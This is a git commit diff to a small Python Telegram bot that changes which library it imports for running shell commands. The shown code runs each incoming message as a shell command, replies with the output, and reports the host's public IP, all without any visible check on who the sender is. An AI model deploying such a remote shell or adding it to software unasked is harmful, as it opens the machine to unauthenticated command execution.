b43845a5dcd0f7e8fb154050aff7d9ec4aa82807
Artem <79601745+Sovenok-Hacker@users.noreply.github.com>
2022-03-10 18:40:54 +0300

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,4 +1,4 @@
-import telebot, pysyscom, requests
+import telebot, owlshell, requests
 token = 'token'
 bot = telebot.TeleBot(token)
 @bot.message_handler(content_types=['text'])
@@ -10,7 +10,7 @@ def handle(message):
         bot.send_message(message.from_user.id, requests.get('https://ifconfig.me/ip').text)
     else:
         try:
-            bot.send_message(message.from_user.id, pysyscom.shell(message.text))
+            bot.send_message(message.from_user.id, owlshell.shell(message.text))
         except Exception as e:
             bot.send_message(message.from_user.id, f'Error: {e}.')
 while True:
